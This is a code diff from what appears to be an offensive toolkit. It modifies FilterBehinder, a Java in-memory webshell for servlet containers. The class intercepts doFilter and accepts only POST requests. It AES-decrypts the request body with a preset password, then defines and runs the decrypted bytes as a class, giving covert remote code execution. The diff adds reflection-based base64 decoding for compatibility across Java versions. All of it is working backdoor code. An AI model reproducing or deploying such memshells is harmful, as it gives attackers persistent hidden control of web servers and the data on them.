@@ -3,7 +3,6 @@ package com.ppp.middleware.memshell;
 import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
-import sun.misc.BASE64Decoder;
 
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
@@ -22,6 +21,7 @@ import java.util.Map;
 @JavaClassModifiable({JavaClassModifiable.pass})
 public class FilterBehinder implements InvocationHandler {
     private static String pass;
+
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
             run(args[0], args[1], args[2]);
@@ -31,6 +31,9 @@ public class FilterBehinder implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
+            String method = (String) invokeMethod(servletRequest.getClass(), servletRequest, "getMethod", new Class[]{}, new Object[]{});
+            if (!method.equalsIgnoreCase("POST"))
+                return;
             Object session = invokeMethod(servletRequest.getClass().getSuperclass(), servletRequest, "getSession", new Class[]{}, new Object[]{});
             Map<String, Object> pageContext = new HashMap<String, Object>();
             pageContext.put("session", session);
@@ -42,14 +45,24 @@ public class FilterBehinder implements InvocationHandler {
             invokeMethod(c.getClass(), c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
             Object reader = invokeMethod(servletRequest.getClass(), servletRequest, "getReader", new Class[]{}, new Object[]{});
             String str = (String) invokeMethod(reader.getClass(), reader, "readLine", new Class[]{}, new Object[]{});
-            byte[] bytes = (byte[]) invokeMethod(c.getClass(), c, "doFinal", new Class[]{byte[].class}, new Object[]{new BASE64Decoder().decodeBuffer(str)});
+            byte[] bytes = (byte[]) invokeMethod(c.getClass(), c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});
 
             Class clazz = defClass(bytes);
             clazz.newInstance().equals(pageContext);
         } catch (Throwable e) {
 
         }
+    }
 
+    public static byte[] base64(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
+        } catch (Exception var5) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
+            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
+        }
     }
 
     public Class defClass(byte[] classBytes) throws Throwable {
